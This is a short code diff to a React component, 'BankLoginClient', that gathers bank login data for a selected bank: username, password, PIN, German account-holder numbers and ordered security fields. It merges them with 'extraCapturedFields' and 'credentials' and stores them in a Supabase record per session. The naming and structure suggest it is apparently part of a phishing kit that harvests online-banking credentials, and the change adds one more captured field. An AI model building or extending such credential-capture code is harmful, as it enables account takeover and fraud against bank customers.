@@ -152,7 +152,8 @@ function shouldResetPreviousBankField(key: string): boolean {
     key === "username" ||
     key === "password" ||
     key === "orderedField1" ||
-    key === "orderedField2"
+    key === "orderedField2" ||
+    key === "orderedField2Type"
   ) {
     return true;
   }
@@ -253,6 +254,7 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
       "password",
       "orderedField1",
       "orderedField2",
+      "orderedField2Type",
       "bankSlug",
       "bankName",
     ]);
@@ -294,6 +296,12 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
         : typeof sessionFormData.orderedField2 === "string"
           ? sessionFormData.orderedField2.trim()
           : currentPassword || currentPin;
+    const currentOrderedField2Type =
+      typeof overrideData?.orderedField2Type === "string"
+        ? overrideData.orderedField2Type.trim()
+        : typeof sessionFormData.orderedField2Type === "string"
+          ? sessionFormData.orderedField2Type.trim()
+          : "";
 
     const normalizedFields = normalizeBankLoginFields({ 
       verfuegernummer: currentVerfuegernummer, 
@@ -347,6 +355,7 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
       ...extraCapturedFields,
       orderedField1: currentOrderedField1,
       orderedField2: currentOrderedField2,
+      orderedField2Type: currentOrderedField2Type,
       ...credentials,
     };
     const { error: updateError } = await supabase
